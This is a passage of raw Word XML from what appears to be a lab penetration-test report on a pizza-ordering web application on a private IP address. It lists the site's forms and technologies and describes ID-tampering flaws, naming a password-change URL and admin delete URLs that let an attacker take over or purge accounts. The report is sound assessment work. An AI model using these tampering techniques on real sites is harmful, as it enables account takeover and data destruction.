          <w:p w14:paraId="28880A96" w14:textId="77777777" w:rsidR="003A7AAA" w:rsidRDefault="002B298F" w:rsidP="00371B99">
            <w:r>
              <w:t xml:space="preserve">Link: </w:t>
            </w:r>
            <w:r w:rsidR="00895CA6">
              <w:t>Place Order</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B06AA2A" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="003C4D81">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="708" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2454"/>
        <w:gridCol w:w="2340"/>
        <w:gridCol w:w="3848"/>
      </w:tblGrid>
      <w:tr w:rsidR="00431728" w14:paraId="15A1B4D4" w14:textId="77777777" w:rsidTr="006057D5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8868" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="79BAFDA6" w14:textId="77777777" w:rsidR="00431728" w:rsidRPr="00C42A28" w:rsidRDefault="00431728" w:rsidP="006057D5">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00371B99">
              <w:t>http://192.168.1.20/partyhalls.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00431728" w14:paraId="60A6FDEE" w14:textId="77777777" w:rsidTr="006057D5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="77A2F5AA" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="006057D5">
            <w:r>
              <w:t>Form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="41B773FE" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="006057D5">
            <w:r>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="35E9AD38" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00091FF6" w:rsidP="006057D5">
            <w:r>
              <w:t>Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00431728" w14:paraId="29C8D46E" w14:textId="77777777" w:rsidTr="006057D5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="01688355" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="006057D5">
            <w:r w:rsidRPr="00371B99">
              <w:t>R</w:t>
            </w:r>
            <w:r>
              <w:t>eserve</w:t>
            </w:r>
            <w:r w:rsidRPr="00371B99">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r w:rsidRPr="00371B99">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>Table</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="21830EA0" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00F81E00" w:rsidP="006057D5">
            <w:r>
              <w:t>Let’s</w:t>
            </w:r>
            <w:r w:rsidR="00431728">
              <w:t xml:space="preserve"> the user reserve a table</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3BD4D330" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="006057D5">
            <w:r>
              <w:t xml:space="preserve">Select: Table </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EB6AD37" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="006057D5">
            <w:r>
              <w:t xml:space="preserve">             Date</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71201827" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="006057D5">
            <w:r>
              <w:t xml:space="preserve">             Time</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="774B9610" w14:textId="77777777" w:rsidR="00895CA6" w:rsidRDefault="002B298F" w:rsidP="006057D5">
            <w:r>
              <w:t xml:space="preserve">Button: </w:t>
            </w:r>
            <w:r w:rsidR="00895CA6">
              <w:t>Reserve</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="188A5A1A" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="003C4D81">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="708" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2454"/>
        <w:gridCol w:w="2340"/>
        <w:gridCol w:w="3848"/>
      </w:tblGrid>
      <w:tr w:rsidR="00371B99" w14:paraId="78CE0F64" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8868" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="0EAF5EA1" w14:textId="77777777" w:rsidR="00371B99" w:rsidRPr="00C42A28" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="00371B99">
              <w:t>http://192.168.1.20/partyhalls.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00371B99" w14:paraId="6A205DE1" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="1431656B" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="460C7789" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="6752AF6A" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00091FF6" w:rsidP="00371B99">
            <w:r>
              <w:t>Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00371B99" w14:paraId="5D150928" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="76BE81E9" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r w:rsidRPr="00371B99">
              <w:t>R</w:t>
            </w:r>
            <w:r>
              <w:t>eserve</w:t>
            </w:r>
            <w:r w:rsidRPr="00371B99">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r w:rsidRPr="00371B99">
              <w:t xml:space="preserve"> P</w:t>
            </w:r>
            <w:r>
              <w:t>arty</w:t>
            </w:r>
            <w:r w:rsidRPr="00371B99">
              <w:t>-H</w:t>
            </w:r>
            <w:r>
              <w:t>all</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="058ACD8C" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00F81E00" w:rsidP="00371B99">
            <w:r>
              <w:t>Let’s</w:t>
            </w:r>
            <w:r w:rsidR="00431728">
              <w:t xml:space="preserve"> the user reserve a hall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="38FC17C0" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="00431728">
            <w:r>
              <w:t>Select: Hall</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A27FAD1" w14:textId="77777777" w:rsidR="00431728" w:rsidRDefault="00431728" w:rsidP="00431728">
            <w:r>
              <w:t xml:space="preserve">             Date</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2ACDE424" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00431728" w:rsidP="00431728">
            <w:r>
              <w:t xml:space="preserve">             Time</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37B6061B" w14:textId="77777777" w:rsidR="00895CA6" w:rsidRDefault="002B298F" w:rsidP="00431728">
            <w:r>
              <w:t xml:space="preserve">Button: </w:t>
            </w:r>
            <w:r w:rsidR="00895CA6">
              <w:t>Reserve</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B0D2B16" w14:textId="77777777" w:rsidR="00371B99" w:rsidRPr="00A0010C" w:rsidRDefault="00371B99" w:rsidP="00371B99"/>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="708" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2443"/>
        <w:gridCol w:w="2343"/>
        <w:gridCol w:w="3856"/>
      </w:tblGrid>
      <w:tr w:rsidR="00371B99" w14:paraId="4B067174" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8868" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="133A9F85" w14:textId="77777777" w:rsidR="00371B99" w:rsidRPr="00C42A28" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:bookmarkStart w:id="17" w:name="_Hlk57996504"/>
            <w:r w:rsidRPr="00371B99">
              <w:t>http://192.168.1.20/ratings.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="17"/>
      <w:tr w:rsidR="00371B99" w14:paraId="5A2872DD" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="513B5B90" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Form</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="6D3476C8" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="656565" w:themeFill="text2" w:themeFillTint="BF"/>
          </w:tcPr>
          <w:p w14:paraId="10BDBDD6" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00091FF6" w:rsidP="00371B99">
            <w:r>
              <w:t>Fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00371B99" w14:paraId="308F6A0D" w14:textId="77777777" w:rsidTr="00371B99">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2510" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5CCB63FF" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00371B99" w:rsidP="00371B99">
            <w:r>
              <w:t>Rate Our Foods</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2392" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="01C81411" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00431728" w:rsidP="00371B99">
            <w:r>
              <w:t>Provides a comment section for the company</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3966" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="73B68F43" w14:textId="77777777" w:rsidR="00371B99" w:rsidRDefault="00091FF6" w:rsidP="00371B99">
            <w:r>
              <w:t xml:space="preserve">Input: </w:t>
            </w:r>
            <w:r w:rsidR="00431728">
              <w:t>Comment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DA2FB4C" w14:textId="77777777" w:rsidR="00091FF6" w:rsidRDefault="00091FF6" w:rsidP="00371B99">
            <w:r>
              <w:t>Button: Rate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="08E44D97" w14:textId="77777777" w:rsidR="0026391D" w:rsidRPr="0026391D" w:rsidRDefault="0026391D" w:rsidP="0026391D"/>
    <w:p w14:paraId="39815DAB" w14:textId="77777777" w:rsidR="00A0010C" w:rsidRDefault="00A0010C" w:rsidP="00A0010C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc58836571"/>
      <w:r>
        <w:t>Identify technologies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="32F32B5C" w14:textId="0B61C228" w:rsidR="00A0010C" w:rsidRDefault="006E3278" w:rsidP="00471EFD">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There </w:t>
      </w:r>
      <w:r w:rsidR="00720F18">
        <w:t>are a number of technologies in use on the web application.</w:t>
      </w:r>
      <w:r w:rsidR="00E852C2">
        <w:t xml:space="preserve"> There were forms present throughout the website for submission of data along with </w:t>
      </w:r>
      <w:r w:rsidR="00AB5B3C">
        <w:t xml:space="preserve">PHP </w:t>
      </w:r>
      <w:r w:rsidR="00E852C2">
        <w:t xml:space="preserve">cookies for tracking user logins. While there was a Java file found on the web application </w:t>
      </w:r>
      <w:r w:rsidR="00D24B6B">
        <w:t xml:space="preserve">that </w:t>
      </w:r>
      <w:r w:rsidR="00E852C2">
        <w:t>was not functioning</w:t>
      </w:r>
      <w:r w:rsidR="00471EFD">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00A0010C" w:rsidRPr="00A0010C">
        <w:t>http://192.168.1.20/js/jquery.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D331C7" w14:textId="77777777" w:rsidR="00471EFD" w:rsidRDefault="003F7C0A" w:rsidP="00471EFD">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>By running the whatweb command we can confirm what was discovered in section 1, that</w:t>
      </w:r>
      <w:r w:rsidR="00AB5B3C">
        <w:t xml:space="preserve"> a web server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is</w:t>
      </w:r>
      <w:r w:rsidR="00AB5B3C">
        <w:t xml:space="preserve"> being run using Apache</w:t>
      </w:r>
      <w:r w:rsidR="001B1CE0">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02297278" w14:textId="77777777" w:rsidR="00AB5B3C" w:rsidRDefault="00AB5B3C" w:rsidP="00AB5B3C">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="47B436F9" wp14:editId="67ADCCF1">
            <wp:extent cx="5247861" cy="519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3069" cy="527188"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B190A89" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRPr="00A0010C" w:rsidRDefault="00BF3571" w:rsidP="00AB5B3C">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AB5F24D" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00A0010C" w:rsidP="00A0010C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc58836572"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Map the attack surface</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="111D5E37" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="009D19D6" w:rsidP="009D19D6">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Looking at the types of fields available </w:t>
      </w:r>
      <w:r w:rsidR="00DF1F0F">
        <w:t xml:space="preserve">there are plenty of </w:t>
      </w:r>
      <w:r w:rsidR="00EF2CDB">
        <w:t>different areas of the website to attack purely based on the</w:t>
      </w:r>
      <w:r w:rsidR="006B23C7">
        <w:t xml:space="preserve"> various input options available for submission on the web application. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB41DE7" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRDefault="00BF3571" w:rsidP="009D19D6">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EEBEA0E" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00257FFB" w:rsidP="00257FFB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc58836573"/>
      <w:r>
        <w:t>Procedure:</w:t>
      </w:r>
      <w:r w:rsidR="00AE012C">
        <w:t xml:space="preserve"> Test </w:t>
      </w:r>
      <w:r w:rsidR="00C5399B">
        <w:t>Client-Side</w:t>
      </w:r>
      <w:r w:rsidR="00AE012C">
        <w:t xml:space="preserve"> Controls</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="4B7EEB55" w14:textId="77777777" w:rsidR="00C5399B" w:rsidRPr="00C5399B" w:rsidRDefault="00C5399B" w:rsidP="00C5399B">
      <w:r>
        <w:t xml:space="preserve">This section takes the vectors identified in the previous section and further scrutinizes them in order </w:t>
      </w:r>
      <w:r w:rsidR="00DC5AAE">
        <w:t>to verify which sections are exploitable. This will mainly be done by the submission of lots of variables into the forms identified in order to collect and analyse the results.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F170A52" w14:textId="77777777" w:rsidR="00EF24F1" w:rsidRDefault="00EF24F1" w:rsidP="00513E6C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc58836574"/>
      <w:r>
        <w:t>Transmission of data via client</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="11F3E1F4" w14:textId="77777777" w:rsidR="00EF24F1" w:rsidRDefault="00A14B86" w:rsidP="00EF24F1">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">During the evaluation of the input forums </w:t>
      </w:r>
      <w:r w:rsidR="00911F9A">
        <w:t>the Zap HUD was used with the hidden fields toggle</w:t>
      </w:r>
      <w:r w:rsidR="00D24B6B">
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00911F9A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A01D83">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00911F9A">
        <w:t>on to identify whether any were present on the page. A manual check was then carried out of all pages which confirmed that none were present on this web application</w:t>
      </w:r>
      <w:r w:rsidR="006462E4">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54301246" w14:textId="77777777" w:rsidR="00B36CFD" w:rsidRDefault="00ED6BB4" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>When looking at the developer tools in the browser a</w:t>
      </w:r>
      <w:r w:rsidR="00513E6C">
        <w:t xml:space="preserve"> secret c</w:t>
      </w:r>
      <w:r w:rsidR="00EF24F1">
        <w:t>ookie</w:t>
      </w:r>
      <w:r w:rsidR="00513E6C">
        <w:t xml:space="preserve"> was discovered. This seems to be transmitting some encrypted </w:t>
      </w:r>
      <w:r w:rsidR="00C5399B">
        <w:t>information,</w:t>
      </w:r>
      <w:r w:rsidR="00513E6C">
        <w:t xml:space="preserve"> but the purpose could not be determined at this stage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5339EFF4" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>After analyzing the list of URLs captured in section 1 (Appendix 1.1) a number of IDs were identified in submissions. This was tested to ensure that the IDs where not an example of insecure access control. This was done by submitting these requests and editing the ID in order to determine what they are used to control. One was the order function:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70B74C63" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="705"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000E2A69">
        <w:t>GET http://192.168.1.20/order-exec.php?id=</w:t>
      </w:r>
      <w:r w:rsidRPr="00C146F2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FA6F9F" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>The ID in this function was found to identify the type of Pizza and therefore could only be used to change the type of pizza being ordered.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C98F1C4" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="705"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000561BD">
        <w:t>http://192.168.1.20/Changepassword.php?id=</w:t>
      </w:r>
      <w:r w:rsidRPr="000561BD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327FBF3A" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>This allows for the submission of a change request on someone else’s behalf. This means that access could be gained to any account by changing the password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D7D16F" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>There is also an ID attached to a number do delete functions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178A8677" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r w:rsidRPr="0001658B">
        <w:t>http://192.168.1.20/admin/delete-member.php?id=16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38552F5D" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r w:rsidRPr="00C5466B">
        <w:t>http://192.168.1.20/admin/delete-category.php?id=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3706DC1A" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:firstLine="705"/>
      </w:pPr>
      <w:r w:rsidRPr="00C5466B">
        <w:t>http://192.168.1.20/admin/delete-special.php?id=7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3698B4" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>These allow an attacker to purge all users or specific ones if they can view the members table. This provide users with access to admin functions without validation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528D0143" w14:textId="77777777" w:rsidR="00325748" w:rsidRDefault="00325748" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0676594F" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00EF24F1" w:rsidP="00ED3CCF">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc58836575"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Client-side input Controls</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="054CE9BE" w14:textId="77777777" w:rsidR="001C5A43" w:rsidRDefault="00EE1635" w:rsidP="00325748">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>For this section the client</w:t>
      </w:r>
